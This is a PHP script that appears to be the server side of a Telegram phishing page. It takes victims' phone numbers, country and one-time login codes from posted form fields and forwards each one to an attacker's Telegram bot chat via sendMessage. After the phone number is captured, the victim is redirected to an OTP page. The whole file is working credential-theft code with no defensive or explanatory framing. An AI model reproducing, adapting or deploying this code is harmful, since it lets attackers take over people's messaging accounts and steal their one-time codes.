<?php 
include"chatId.php";

if(isset($_POST['phoneNumber'])) {
    $phone = $_POST['phoneNumber'];
    $subject = "-[[ Notif Telegram MY ]]-";
    $pesanas = $subject . PHP_EOL . PHP_EOL . 'Phone Number: ' . $phone;
    sendMessage($chatID, $pesanas, $botToken);

    if($pesanas) {
        session_start();
        $_SESSION['p'] = $phone;

        header('location: otp.php');
    }
} elseif(isset($_POST['phoneNumberrr']) && isset($_POST['countryName']) && isset($_POST['pin1']) && isset($_POST['pin2']) && isset($_POST['pin3']) && isset($_POST['pin4']) && isset($_POST['pin5'])) {
    $phone = $_POST['phoneNumberrr'];
    $count = $_POST['countryName'];
    $getPin = $_POST['pin1'] . "" . $_POST['pin2'] . "" . $_POST['pin3'] . "" . $_POST['pin4'] . "" . $_POST['pin5'];

    $subject = "-[[ Notif Telegram MY ]]-";
    $pesanas = $subject . PHP_EOL . PHP_EOL . 'Phone Number: ' . $phone . PHP_EOL . 'Country: ' . $count . PHP_EOL . 'OTP Code: ' . $getPin;
    sendMessage($chatID, $pesanas, $botToken);
} elseif(isset($_POST['phoneNumberr']) && isset($_POST['countryName']) && isset($_POST['pin1']) && isset($_POST['pin2']) && isset($_POST['pin3']) && isset($_POST['pin4']) && isset($_POST['pin5']) && isset($_POST['pin6'])) {
    $phone = $_POST['phoneNumberr'];
    $count = $_POST['countryName'];
    $getPin = $_POST['pin1'] . "" . $_POST['pin2'] . "" . $_POST['pin3'] . "" . $_POST['pin4'] . "" . $_POST['pin5'] . "" . $_POST['pin6'];

    $subject = "-[[ Notif Telegram MY ]]-";
    $pesanas = $subject . PHP_EOL . PHP_EOL . 'Phone Number: ' . $phone . PHP_EOL . 'Country: ' . $count . PHP_EOL . 'OTP Code: ' . $getPin;
    sendMessage($chatID, $pesanas, $botToken);
}

?>